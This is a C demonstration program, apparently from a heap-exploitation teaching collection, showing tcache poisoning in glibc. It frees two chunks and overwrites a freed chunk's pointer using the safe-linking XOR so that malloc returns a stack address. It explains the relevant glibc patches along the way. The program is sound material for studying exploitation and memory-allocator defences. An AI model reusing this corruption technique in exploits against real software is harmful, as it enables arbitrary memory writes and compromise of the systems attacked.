#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>

int main()
{
	// disable buffering
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	printf("This file demonstrates a simple tcache poisoning attack by tricking malloc into\n"
		   "returning a pointer to an arbitrary location (in this case, the stack).\n"
		   "The attack is very similar to fastbin corruption attack.\n");
	printf("After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n"
		   "We have to create and free one more chunk for padding before fd pointer hijacking.\n\n");
	printf("After the patch https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41,\n"
		   "An heap address leak is needed to perform tcache poisoning.\n"
		   "The same patch also ensures the chunk returned by tcache is properly aligned.\n\n");

	size_t stack_var[0x10];
	size_t *target = NULL;

	// choose a properly aligned target address
	for(int i=0; i<0x10; i++) {
		if(((long)&stack_var[i] & 0xf) == 0) {
			target = &stack_var[i];
			break;
		}
	}
	assert(target != NULL);

	printf("The address we want malloc() to return is %p.\n", target);

	printf("Allocating 2 buffers.\n");
	intptr_t *a = malloc(128);
	printf("malloc(128): %p\n", a);
	intptr_t *b = malloc(128);
	printf("malloc(128): %p\n", b);

	printf("Freeing the buffers...\n");
	free(a);
	free(b);

	printf("Now the tcache list has [ %p -> %p ].\n", b, a);
	printf("We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
		   "to point to the location to control (%p).\n", sizeof(intptr_t), b, target);
	// VULNERABILITY
	// the following operation assumes the address of b is known, which requires a heap leak
	b[0] = (intptr_t)((long)target ^ (long)b >> 12);
	// VULNERABILITY
	printf("Now the tcache list has [ %p -> %p ].\n", b, target);

	printf("1st malloc(128): %p\n", malloc(128));
	printf("Now the tcache list has [ %p ].\n", target);

	intptr_t *c = malloc(128);
	printf("2nd malloc(128): %p\n", c);
	printf("We got the control\n");

	assert((long)target == (long)c);
	return 0;
}
